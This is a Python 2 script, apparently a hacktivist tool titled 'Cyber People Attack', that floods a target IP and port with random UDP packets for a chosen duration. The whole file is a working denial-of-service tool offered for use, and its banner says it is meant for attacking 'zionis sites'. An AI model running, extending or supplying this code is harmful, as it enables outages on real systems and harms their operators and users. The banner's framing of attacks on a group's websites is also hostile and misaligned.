#!/use/bin/python2
#code by Abdullah Al Asad
#
#
import time
import socket
import random
import sys
import os
def usage():
    os.system("clear")
    print ("\033[32m")
    os.system("figlet CYBER PEOPLE ATTACK")
    print "	     \033[30m>>>>>>>>>>>> \033[33m VOL.03 \033[30m<<<<<<<<<<<<"
    print '''\033[34m==============================================|
 \033[33m-> Mod 1 : \033[32mAbdullah Al Asad                  \033[34m|
 \033[33m-> Mod 2 : \033[32mZeb4nk                            \033[34m|
 \033[33m       ------"WARNING"------                 \033[34m|
 \033[33m-> This Tools just for CPA members           \033[34m|
 \033[33m-> This Tools just for Attacking zionis sites\033[34m|
 \033[34m=============================================|'''
    
    print '''\033[36m
    use :
        |----------->>>> python2 CPA3.py <ip> <port> <packet>
    ex  :
        |----------->>>> python2 CPA3.py 172.0.0.1 80 3000 '''
time.sleep(3)
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[32mCyber People Attack  %s \033[31msent packages %s \033[33mat the port %s "%(sent, victim, vport)

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

